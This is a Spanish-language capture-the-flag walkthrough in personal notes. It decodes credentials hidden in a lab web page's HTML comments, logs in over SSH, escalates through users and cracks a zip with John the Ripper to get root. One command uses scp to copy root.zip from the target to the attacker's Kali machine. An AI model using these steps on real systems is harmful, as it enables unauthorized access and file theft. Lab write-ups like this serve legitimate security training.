Hacemos el escaneo con nmap:
![[Mis apuntes/ANEXOS/Pasted image 20230925091918.png]]
Y esta es la web:
![[Mis apuntes/ANEXOS/Pasted image 20230925091928.png]]
Si vemos el código fuente vemos este comentario:
![[Mis apuntes/ANEXOS/Pasted image 20230925092052.png]]
Por lo que accedemos aquí:
![[Mis apuntes/ANEXOS/Pasted image 20230925092109.png]]
Y volvemos a ver otro comentario:
![[Mis apuntes/ANEXOS/Pasted image 20230925092124.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230925092136.png]]
Y en la parte de la derecha del todo vemos unas líneas que ponen user y abajo del todo una pass:
```bash
<!-- USER .- .-.. .. -.-. . -->
<!-- PASS 53586470624778486230526c5a58426c63673d3d -->
```
![[Mis apuntes/ANEXOS/Pasted image 20230925092308.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230925092215.png]]
Sacamos la contraseña con cyberchef aplicándole el filtro de magic:
![[Mis apuntes/ANEXOS/Pasted image 20230925092500.png]]
Y sacamos el user de la misma forma:
![[Mis apuntes/ANEXOS/Pasted image 20230925092523.png]]
```bash
alice:IwillGoDeeper
```
Probamos en acceder vía ssh y vemos que funciona:
![[Mis apuntes/ANEXOS/Pasted image 20230925092649.png]]
Viendo archivos ocultos nos encontramos con un .bob.txt:
![[Mis apuntes/ANEXOS/Pasted image 20230925092822.png]]
```bash
535746745247566c634556756233566e61413d3d
```
![[Mis apuntes/ANEXOS/Pasted image 20230925092857.png]]
Que nos extrae lo siguiente:
```bash
IamDeepEnough
```
Y usando esta clave nos convertimos en el usuario bob:
![[Mis apuntes/ANEXOS/Pasted image 20230925092957.png]]
Y dentro de la raíz nos encontramos con un archivo zip:
![[Mis apuntes/ANEXOS/Pasted image 20230925093026.png]]
Vamos a enviarnos este archivo por scp a nuestra máquina atacante:
```bash
scp root.zip kali@192.168.0.63:/home/kali/Desktop/
```
![[Mis apuntes/ANEXOS/Pasted image 20230925093528.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230925093535.png]]
Y tenemos una contraseña que tendremos que crackear usando john the ripper:
![[Mis apuntes/ANEXOS/Pasted image 20230925093604.png]]
Y vemos que la contraseña es bob:
![[Mis apuntes/ANEXOS/Pasted image 20230925093653.png]]
Y ya tenemos la password de root:
```bash
root:IhateMyPassword
```
![[Mis apuntes/ANEXOS/Pasted image 20230925093713.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230925093739.png]]
